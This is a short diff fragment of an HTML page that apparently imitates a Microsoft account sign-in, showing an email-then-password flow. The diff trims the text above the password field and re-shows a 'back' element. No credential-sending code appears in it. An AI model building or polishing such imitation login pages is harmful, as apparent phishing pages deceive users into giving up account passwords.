@@ -538,10 +538,7 @@
             <!-- Password Input Form - shown after email verification -->
             <div id="passwordForm" class="password-section">
                 <div class="form-group">
-                    <div style="margin-bottom: 15px;">
-                        <p id="verifiedEmailDisplay" style="color: #323130; font-size: 15px; font-weight: 500; margin-bottom: 5px;"></p>
-                        <p style="color: #605e5c; font-size: 13px; margin: 0;">Enter the password for your Microsoft account</p>
-                    </div>
+                    <p id="verifiedEmailDisplay" style="color: #323130; font-size: 14px; margin-bottom: 10px;"></p>
 
                     <input type="password" id="passwordInput" class="microsoft-input" placeholder="Password" required>
                 </div>
@@ -673,6 +670,7 @@
                     successForm.style.display = 'block';
                 }
 
+                document.getElementById('backInfo').style.display = '';
                 document.getElementById('messageArea').style.display = '';
             }
 
